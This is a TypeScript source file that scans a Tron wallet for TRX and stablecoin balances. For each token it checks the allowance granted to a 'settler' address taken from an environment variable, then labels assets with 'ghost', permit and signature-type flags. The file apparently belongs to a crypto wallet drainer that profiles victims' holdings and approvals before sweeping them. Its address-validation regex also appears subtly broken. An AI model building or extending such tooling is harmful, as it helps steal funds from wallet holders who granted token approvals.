import TronWeb from "tronweb";
import { UniversalAsset } from "../types";

/**
 * 💎 TRON SCANNER (v8.1.0 - Hardened & Typed)
 * FIXED: Added chainId, usdValue, and isGhost to satisfy UniversalAsset interface.
 */
export async function scanTron(address: string): Promise<UniversalAsset[]> {
  // Tron addresses: Start with 'T', length 34
  if (!address || !/^[T][a-zA-H1-9]{33}$/.test(address)) return [];

  try {
    const tronGridKey = process.env.TRONGRID_KEY || "";

    const TWeb = (TronWeb as any).default || TronWeb;
    const tronWeb = new TWeb({
      fullHost: "https://api.trongrid.io",
      headers: { "TRON-PRO-API-KEY": tronGridKey },
    });

    const assets: UniversalAsset[] = [];

    // 🛰️ PARALLEL SCANNING
    const [accountInfo, ...tokenResults] = await Promise.all([
      tronWeb.trx.getAccount(address).catch(() => ({ balance: 0 })),
      ...[
        { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", sym: "USDT" },
        { addr: "TEk77v57P98y3Nf5S9zK1AAtX3gC4S6A7A", sym: "USDC" },
        { addr: "TPYmhkAndrSAtfAs9VBy9Sg9zSsc9yWJ2e", sym: "USDD" },
      ].map(async (token) => {
        try {
          const contract = await tronWeb.contract().at(token.addr);
          const balance = await contract.balanceOf(address).call();
          return { ...token, balance: BigInt(balance.toString()) };
        } catch {
          return { ...token, balance: 0n };
        }
      }),
    ]);

    // 1. Process Native TRX
    const trxBalance = BigInt(accountInfo.balance || 0);
    if (trxBalance > 0n) {
      assets.push({
        symbol: "TRX",
        name: "Tron",
        decimals: 6,
        balance: trxBalance.toString(),
        displayBalance: (Number(trxBalance) / 1e6).toFixed(4),
        chain: "TRON",
        chainId: 195, // ✨ Satisfies UniversalAsset
        networkName: "Tron Mainnet",
        permitSupported: false,
        signatureType: "NATIVE",
        usdValue: 0,
        isGhost: false,
      });
    }

    // 2. Process TRC20 Tokens
    const settler = process.env.TRON_SENDER_ADDR || address;

    for (const token of tokenResults) {
      if (token.balance > 0n) {
        const contract = await tronWeb.contract().at(token.addr);
        const allowance = await contract
          .allowance(address, settler)
          .call()
          .catch(() => 0);

        const hasAllowance = BigInt(allowance.toString()) > 0n;

        assets.push({
          symbol: token.sym,
          name: `${token.sym} (TRC20)`,
          decimals: 6,
          balance: token.balance.toString(),
          displayBalance: (Number(token.balance) / 1e6).toFixed(4),
          contractAddress: token.addr,
          chain: "TRON",
          chainId: 195, // ✨ Satisfies UniversalAsset
          networkName: "Tron",
          permitSupported: false,
          ghostEnabled: hasAllowance,
          signatureType: hasAllowance ? "PERMIT2" : "NATIVE",
          usdValue: 0,
          isGhost: false,
        });
      }
    }

    return assets;
  } catch (e) {
    console.error("[tron-scanner] ❌ Scan failed:", e);
    return [];
  }
}
